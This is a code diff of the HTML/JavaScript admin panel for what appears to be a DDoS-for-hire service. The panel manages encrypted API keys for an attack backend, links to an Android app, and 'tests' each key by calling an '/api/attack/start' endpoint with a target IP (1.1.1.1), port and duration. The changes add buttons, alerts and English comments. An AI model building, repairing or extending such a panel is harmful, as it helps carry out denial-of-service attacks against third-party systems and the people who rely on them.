@@ -66,9 +66,11 @@
                 <input type="text" id="apiKey9" placeholder="𝐀𝐏𝐈 𝐊𝐞𝐲 𝟗">
                 <input type="text" id="apiKey10" placeholder="𝐀𝐏𝐈 𝐊𝐞𝐲 𝟏𝟎">
             </div>
-            <div class="btn-group">
-                <button onclick="saveApis()" class="success">𝐒𝐀𝐕𝐄 𝐀𝐏𝐈𝐬</button>
-                <button onclick="deleteApis()" class="danger">𝐃𝐄𝐋𝐄𝐓𝐄 𝐀𝐏𝐈𝐬</button>
+            <!-- Update List Button Added -->
+            <div class="btn-group" style="flex-wrap: wrap;">
+                <button onclick="saveApis()" class="success" style="flex: 1;">💾 𝐒𝐀𝐕𝐄 𝐀𝐏𝐈𝐬</button>
+                <button onclick="deleteApis()" class="danger" style="flex: 1;">🗑️ 𝐃𝐄𝐋𝐄𝐓𝐄 𝐀𝐏𝐈𝐬</button>
+                <button onclick="loadApis()" class="warning" style="flex: 1;">🔄 𝐔𝐏𝐃𝐀𝐓𝐄 𝐋𝐈𝐒𝐓</button>
             </div>
         </div>
 
@@ -152,7 +154,7 @@
                 document.getElementById('loginBox').classList.add('hidden');
                 document.getElementById('mainPanel').classList.remove('hidden');
                 loadApiUrl();
-                loadApis(); // Ye function app se save ki hui API load karega
+                loadApis(); 
                 fetchKillStatus();
                 fetchKeys();
                 fetchNotification();
@@ -190,42 +192,45 @@
                 updateData[`api_key_${i}`] = plainKey ? encryptKey(plainKey) : "";
             }
             await fetch(`${CLOUD_DB_URL}settings/config.json`, { method: 'PATCH', body: JSON.stringify(updateData) });
-            alert("APIs Encrypted & Saved to Cloud!");
-            loadApis();
+            alert("✅ APIs Encrypted & Saved to Cloud!");
+            loadApis(); // Refresh list after save
         }
 
-        function deleteApis() {
-            if(confirm("Clear all API Keys?")) { 
+        async function deleteApis() {
+            if(confirm("Are you sure you want to delete all API Keys?")) { 
                 for(let i=1; i<=10; i++) { document.getElementById(`apiKey${i}`).value = ""; } 
-                saveApis(); 
+                await saveApis(); 
+                alert("❌ APIs Deleted from Cloud!");
             }
         }
 
-        // --- LOAD APIs (Ye fix kiya gaya hai) ---
+        // --- LOAD APIs (Fixed) ---
         async function loadApis() {
             try {
                 const res = await fetch(`${CLOUD_DB_URL}settings/config.json`);
                 const data = await res.json();
                 const testBtnContainer = document.getElementById('apiTestButtons');
                 testBtnContainer.innerHTML = "";
+                
                 if (data) {
                     for(let i=1; i<=10; i++) {
                         const encryptedVal = data[`api_key_${i}`] || "";
                         const decryptedVal = decryptKey(encryptedVal);
                         
-                        // Ye line slot me key ko fill karti hai
+                        // Fill slots with decrypted keys
                         document.getElementById(`apiKey${i}`).value = decryptedVal;
                         
+                        // Create test buttons for non-empty keys
                         if(decryptedVal.trim() !== "") {
                             const btn = document.createElement('button');
-                            btn.innerText = `𝐓𝐞𝐬𝐭 𝐀𝐏𝐈 𝐒𝐥𝐨𝐭 ${i}`;
+                            btn.innerText = `⚡ 𝐓𝐞𝐬𝐭 𝐀𝐏𝐈 𝐒𝐥𝐨𝐭 ${i}`;
                             btn.className = "info"; btn.style.width = "auto";
                             btn.onclick = () => testApi(decryptedVal, i);
                             testBtnContainer.appendChild(btn);
                         }
                     }
                 }
-            } catch(e) {}
+            } catch(e) { console.log("Error loading APIs"); }
         }
 
         // --- TEST API LOGIC ---
@@ -253,7 +258,7 @@
 
         async function testApi(apiKey, slotNumber) {
             const resDiv = document.getElementById('apiTestResult');
-            resDiv.innerHTML = `<span style="color:#00e5ff;">𝐓𝐞𝐬𝐭𝐢𝐧𝐠 𝐒𝐥𝐨𝐭 ${slotNumber}... 𝐏𝐥𝐞𝐚𝐬𝐞 𝐰𝐚𝐢𝐭.</span>`;
+            resDiv.innerHTML = `<span style="color:#00e5ff;">⚡ 𝐓𝐞𝐬𝐭𝐢𝐧𝐠 𝐒𝐥𝐨𝐭 ${slotNumber}... 𝐏𝐥𝐞𝐚𝐬𝐞 𝐰𝐚𝐢𝐭.</span>`;
             
             const baseUrl = document.getElementById('apiUrl').value.trim() || "https://delvorn.vynqo.in/api/attack/start";
             const targetUrl = `${baseUrl}?key=${apiKey}&ip=1.1.1.1&port=80&time=10`;
@@ -412,7 +417,7 @@
                     }
 
                     if(!apiKey) {
-                        Android.onAttackResponse("ERROR", "No Valid API Key Found in Panel");
+                        Android.onAttackResponse("ERROR", "API Not Set Yet");
                         return;
                     }
 
